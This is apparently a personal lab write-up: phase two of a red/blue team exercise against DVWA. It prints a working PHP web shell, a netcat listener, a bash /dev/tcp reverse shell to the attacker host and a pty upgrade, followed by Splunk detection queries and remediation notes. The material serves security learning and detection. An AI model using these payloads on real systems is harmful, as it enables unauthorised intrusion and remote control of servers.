# Phase 2: Initial Access

**Goal:** Exploit DVWA's file upload vulnerability to get a reverse shell on the Ubuntu host, turning a web vulnerability into interactive system access. This would be **MITRE ATT&CK technique T1190: Exploit Public-Facing Application.**
---

## Red Team

### Vulnerability

DVWA's file upload page accepts user-supplied files with no server-side validation of file type or content. The plan:

1. Upload a PHP web shell disguised as an image
2. Trigger execution by browsing to the uploaded file's path
3. Upgrade to a full reverse shell

---

### Step 1: Web Shell Upload

Created a minimal PHP web shell that passes a URL parameter directly to `system()`:

**Payload:**
```php
<?php system($_GET["cmd"]); ?>
```

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

![Creating shell.php on Kali — one-liner written to /tmp/shell.php and confirmed with cat](../screenshots/phase2-webshell-create.png)

At security level "Low", DVWA performs no server-side validation, so the `.php` extension was accepted without modification or Content-Type tricks.

![DVWA File Upload — shell.php successfully uploaded to ../../hackable/uploads/](../screenshots/phase2-webshell-upload.png)

**Uploaded file path:**
```
http://192.168.100.20/dvwa/hackable/uploads/shell.php
```

---

### Step 2: Web Shell Execution

Triggered the shell by browsing to the upload path with a `cmd` parameter:

```
http://192.168.100.20/dvwa/hackable/uploads/shell.php?cmd=whoami
```

![Web shell RCE confirmed — server returned "www-data"](../screenshots/phase2-webshell-rce.png)

**Confirmed running as:** `www-data`
The problem with this is that www-data is low-level privileges; mainly just for the Apache web server. Best red team practice is to perform privilege escalation (going from low-level access to root), establish persitence, exfiltrate/compromise what's relevant to your objective, wipe evidence, and GTFO. Here, though, I'm not just escalating privileges to exfiltrate; I also need to pivot to **ANOTHER** machine. To start, I need a better shell to interact with Ubuntu. This brings us to...

### Step 3: Reverse Shell

**Kali listener:**
```bash
nc -lvnp 4444
```
Netcat (NC) is exactly what you'd think it is: it *catches* incoming connections on the port you've configured to listen for that very connection. 

**Payload sent through web shell** (URL-encoded in browser address bar):
```bash
bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'
```
From what I understand about this command, it's telling Ubuntu to establish an interactive shell and push it's output through the connection to Kali (.100.10), and to *ALSO* accept all incoming input from that very same connection (the 0>&1). 

Shell received and upgraded to a full PTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
This hardens the original shell that's been established, because research told me that shell isn't very reliable.

![Reverse shell received on Kali — connection from 192.168.100.20:49900, upgraded with python3 pty spawn](../screenshots/phase2-reverse-shell.png)

**Shell confirmed as:** `www-data@ubuntudvwa:/var/www/html/dvwa/hackable/uploads$`

---

## Blue Team — What Splunk Saw

### Detection Queries

```
index=* sourcetype=apache_access uri_path="*/uploads/*" method=POST
```

```
index=* sourcetype=apache_access uri_path="*/uploads/*.php"
```

```
index=* dest_ip=192.168.100.10 dest_port=4444
```

### What Fired

Apache access logs captured the POST upload and the subsequent GET requests to `shell.php` with query parameters. The pattern — a POST to an upload endpoint followed immediately by GET requests to the same path with shell commands in the query string — is a strong web shell signature.

### What Was Missed

The reverse shell payload was sent as a URL-encoded query string over plain HTTP. However, the outbound connection itself (Ubuntu reaching out to Kali on port 4444) wouldn't appear in Apache logs. A network-level alert on unexpected outbound connections from the web server would be needed to catch this half of the attack.

---

## Key Takeaways

- **File upload without server-side validation is critical severity.** At Low security, the `.php` extension was accepted with no resistance. The fix is validating file content (magic bytes), not just extension or Content-Type header.
- **www-data is intentionally unprivileged.** It can read web files and write to the uploads directory, but can't read `/etc/shadow`, write system configs, or pivot elsewhere easily. Getting RCE (remote code execution) as www-data is a foothold, but there's more to do.
- **Web shells in upload directories are detectable.** Any `.php` file POSTed to an uploads path then GETted with system command parameters is a textbook pattern that any WAF or SIEM rule set should cover.

---

← [Phase 1 — Recon](phase1-recon.md) | [Phase 3 — Privilege Escalation](phase3-privesc.md) →
